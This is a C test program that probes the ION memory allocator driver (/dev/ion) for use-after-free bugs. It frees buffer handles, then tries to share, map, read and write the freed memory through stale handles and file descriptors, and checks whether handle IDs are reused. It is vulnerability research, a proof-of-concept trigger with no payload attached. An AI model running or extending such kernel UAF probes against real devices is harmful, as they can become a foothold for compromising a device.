/*
 * ion_uaf_test.c — Targeted ION use-after-free test
 *
 * Tests whether freed ION handles can still be used to:
 * 1. Get a dma-buf fd via SHARE
 * 2. mmap and read/write that buffer
 *
 * If successful, this is a real UAF — the buffer was freed but
 * we still have access to the memory.
 */
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>

typedef int ion_user_handle_t;

struct ion_allocation_data {
    size_t len;
    size_t align;
    unsigned int heap_id_mask;
    unsigned int flags;
    ion_user_handle_t handle;
};

struct ion_fd_data {
    ion_user_handle_t handle;
    int fd;
};

struct ion_handle_data {
    ion_user_handle_t handle;
};

#define ION_IOC_MAGIC   'I'
#define ION_IOC_ALLOC   _IOWR(ION_IOC_MAGIC, 0, struct ion_allocation_data)
#define ION_IOC_FREE    _IOWR(ION_IOC_MAGIC, 1, struct ion_handle_data)
#define ION_IOC_MAP     _IOWR(ION_IOC_MAGIC, 2, struct ion_fd_data)
#define ION_IOC_SHARE   _IOWR(ION_IOC_MAGIC, 4, struct ion_fd_data)
#define ION_IOC_IMPORT  _IOWR(ION_IOC_MAGIC, 5, struct ion_fd_data)

/* Magic pattern to detect stale data */
#define MAGIC_PATTERN 0xDEADBEEF

int main(void) {
    fprintf(stderr, "=== ION UAF Targeted Test ===\n\n");

    int fd = open("/dev/ion", O_RDWR);
    if (fd < 0) {
        fprintf(stderr, "[-] open /dev/ion: %s\n", strerror(errno));
        return 1;
    }

    /* ===== Test 1: Simple alloc → free → share (same handle ID) ===== */
    fprintf(stderr, "--- Test 1: alloc → free → share ---\n");
    {
        struct ion_allocation_data a = {0};
        a.len = 4096; a.align = 4096; a.heap_id_mask = 0x01; a.flags = 0;
        if (ioctl(fd, ION_IOC_ALLOC, &a) != 0) {
            fprintf(stderr, "  alloc failed: %s\n", strerror(errno));
            goto test2;
        }
        ion_user_handle_t h = a.handle;
        fprintf(stderr, "  alloc: handle=%d\n", h);

        /* Write magic pattern via map */
        struct ion_fd_data m = { .handle = h, .fd = -1 };
        if (ioctl(fd, ION_IOC_MAP, &m) == 0) {
            uint32_t *p = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, m.fd, 0);
            if (p != MAP_FAILED) {
                p[0] = MAGIC_PATTERN;
                p[1] = 0xCAFEBABE;
                fprintf(stderr, "  wrote magic: %08x %08x\n", p[0], p[1]);
                munmap(p, 4096);
            }
            close(m.fd);
        }

        /* Free the handle */
        struct ion_handle_data f = { .handle = h };
        errno = 0;
        int fret = ioctl(fd, ION_IOC_FREE, &f);
        fprintf(stderr, "  free: ret=%d errno=%d\n", fret, errno);

        /* Try to share the freed handle */
        struct ion_fd_data s = { .handle = h, .fd = -1 };
        errno = 0;
        int sret = ioctl(fd, ION_IOC_SHARE, &s);
        fprintf(stderr, "  share after free: ret=%d errno=%d fd=%d\n", sret, errno, s.fd);

        if (sret == 0 && s.fd >= 0) {
            fprintf(stderr, "  !! SHARE SUCCEEDED ON FREED HANDLE !!\n");
            /* Try to mmap and read */
            uint32_t *p = mmap(NULL, 4096, PROT_READ, MAP_SHARED, s.fd, 0);
            if (p != MAP_FAILED) {
                fprintf(stderr, "  !! MMAP SUCCEEDED: data=%08x %08x\n", p[0], p[1]);
                if (p[0] == MAGIC_PATTERN)
                    fprintf(stderr, "  !! CRITICAL: MAGIC PATTERN FOUND — REAL UAF !!\n");
                munmap(p, 4096);
            } else {
                fprintf(stderr, "  mmap failed: %s\n", strerror(errno));
            }
            close(s.fd);
        } else {
            fprintf(stderr, "  share correctly failed\n");
        }
    }

test2:
    /* ===== Test 2: alloc → share (get fd) → free → use fd ===== */
    fprintf(stderr, "\n--- Test 2: alloc → share → free → mmap via stale fd ---\n");
    {
        struct ion_allocation_data a = {0};
        a.len = 4096; a.align = 4096; a.heap_id_mask = 0x01; a.flags = 0;
        if (ioctl(fd, ION_IOC_ALLOC, &a) != 0) {
            fprintf(stderr, "  alloc failed\n");
            goto test3;
        }
        fprintf(stderr, "  alloc: handle=%d\n", a.handle);

        /* Share first (get dma-buf fd) */
        struct ion_fd_data s = { .handle = a.handle, .fd = -1 };
        if (ioctl(fd, ION_IOC_SHARE, &s) != 0) {
            fprintf(stderr, "  share failed\n");
            goto test3;
        }
        int share_fd = s.fd;
        fprintf(stderr, "  share: fd=%d\n", share_fd);

        /* Map and write pattern before free */
        uint32_t *pre = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, share_fd, 0);
        if (pre != MAP_FAILED) {
            pre[0] = 0xAAAAAAAA;
            pre[1] = 0xBBBBBBBB;
            fprintf(stderr, "  pre-free write: %08x %08x\n", pre[0], pre[1]);
            munmap(pre, 4096);
        }

        /* Free the handle */
        struct ion_handle_data f = { .handle = a.handle };
        int fret = ioctl(fd, ION_IOC_FREE, &f);
        fprintf(stderr, "  free: ret=%d\n", fret);

        /* Try to mmap via the still-open share_fd */
        uint32_t *post = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, share_fd, 0);
        if (post != MAP_FAILED) {
            fprintf(stderr, "  !! POST-FREE MMAP VIA STALE FD: %08x %08x\n", post[0], post[1]);
            if (post[0] == 0xAAAAAAAA)
                fprintf(stderr, "  !! DATA PERSISTS AFTER FREE — dma-buf keeps buffer alive\n");
            /* Try writing */
            post[0] = 0xCCCCCCCC;
            fprintf(stderr, "  !! POST-FREE WRITE OK: %08x\n", post[0]);
            munmap(post, 4096);
        } else {
            fprintf(stderr, "  post-free mmap failed: %s\n", strerror(errno));
        }
        close(share_fd);
    }

test3:
    /* ===== Test 3: import creates extra reference ===== */
    fprintf(stderr, "\n--- Test 3: alloc → share → import → free(orig) → share(import) ---\n");
    {
        struct ion_allocation_data a = {0};
        a.len = 4096; a.align = 4096; a.heap_id_mask = 0x01; a.flags = 0;
        if (ioctl(fd, ION_IOC_ALLOC, &a) != 0) goto test4;
        fprintf(stderr, "  alloc: handle=%d\n", a.handle);

        /* Share to get dma-buf fd */
        struct ion_fd_data s = { .handle = a.handle, .fd = -1 };
        if (ioctl(fd, ION_IOC_SHARE, &s) != 0) goto test4;
        fprintf(stderr, "  share: fd=%d\n", s.fd);

        /* Import → creates a second handle to same buffer */
        struct ion_fd_data imp = { .fd = s.fd, .handle = 0 };
        if (ioctl(fd, ION_IOC_IMPORT, &imp) != 0) goto test4;
        fprintf(stderr, "  import: handle=%d\n", imp.handle);

        /* Free original handle */
        struct ion_handle_data f = { .handle = a.handle };
        int fret = ioctl(fd, ION_IOC_FREE, &f);
        fprintf(stderr, "  free(original): ret=%d\n", fret);

        /* Try share on imported handle (should still work — buffer alive via import) */
        struct ion_fd_data s2 = { .handle = imp.handle, .fd = -1 };
        errno = 0;
        int sret = ioctl(fd, ION_IOC_SHARE, &s2);
        fprintf(stderr, "  share(imported): ret=%d fd=%d (expected: success)\n", sret, s2.fd);
        if (sret == 0) close(s2.fd);

        /* Try share on original (freed) handle — should fail */
        struct ion_fd_data s3 = { .handle = a.handle, .fd = -1 };
        errno = 0;
        sret = ioctl(fd, ION_IOC_SHARE, &s3);
        fprintf(stderr, "  share(original freed): ret=%d errno=%d (expected: fail)\n", sret, errno);
        if (sret == 0) {
            fprintf(stderr, "  !! SHARE ON FREED ORIGINAL SUCCEEDED !!\n");
            close(s3.fd);
        }

        /* Cleanup */
        struct ion_handle_data f2 = { .handle = imp.handle };
        ioctl(fd, ION_IOC_FREE, &f2);
        close(s.fd);
    }

test4:
    /* ===== Test 4: Handle ID reuse detection ===== */
    fprintf(stderr, "\n--- Test 4: Handle ID reuse (alloc → free → alloc) ---\n");
    {
        /* Alloc 3 handles to see the pattern */
        ion_user_handle_t ids[3];
        for (int i = 0; i < 3; i++) {
            struct ion_allocation_data a = {0};
            a.len = 4096; a.align = 4096; a.heap_id_mask = 0x01; a.flags = 0;
            ioctl(fd, ION_IOC_ALLOC, &a);
            ids[i] = a.handle;
            fprintf(stderr, "  alloc[%d]: handle=%d\n", i, ids[i]);
        }

        /* Free them all */
        for (int i = 0; i < 3; i++) {
            struct ion_handle_data f = { .handle = ids[i] };
            ioctl(fd, ION_IOC_FREE, &f);
            fprintf(stderr, "  free[%d]: handle=%d\n", i, ids[i]);
        }

        /* Alloc again — check if IDs are reused */
        for (int i = 0; i < 3; i++) {
            struct ion_allocation_data a = {0};
            a.len = 4096; a.align = 4096; a.heap_id_mask = 0x01; a.flags = 0;
            ioctl(fd, ION_IOC_ALLOC, &a);
            fprintf(stderr, "  re-alloc[%d]: handle=%d (was %d) %s\n",
                    i, a.handle, ids[i],
                    a.handle == ids[i] ? "REUSED" : "new");
            struct ion_handle_data f = { .handle = a.handle };
            ioctl(fd, ION_IOC_FREE, &f);
        }
    }

    close(fd);
    fprintf(stderr, "\n=== ION UAF Test Complete ===\n");
    return 0;
}
